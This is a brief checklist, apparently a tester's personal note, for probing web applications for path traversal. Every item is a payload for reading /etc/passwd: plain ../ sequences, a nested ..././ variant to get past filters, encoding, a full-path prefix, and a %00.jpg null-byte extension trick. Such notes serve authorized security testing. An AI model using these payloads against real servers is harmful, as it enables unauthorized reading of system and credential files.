check for path traversal if you notice server request file or images or path

- try absolute path /etc/passwd
- try to go back ../../../../../etc/passwd
- try ..././..././..././..././etc/passwd  => maybe he delete ../ so ..././ -> ../
- try to encode payload
- full path and use ../ like -> var/www/images/../../../../../../etc/passwd
- try to manipulate extenstion ../../../etc/passwd%00.jpg
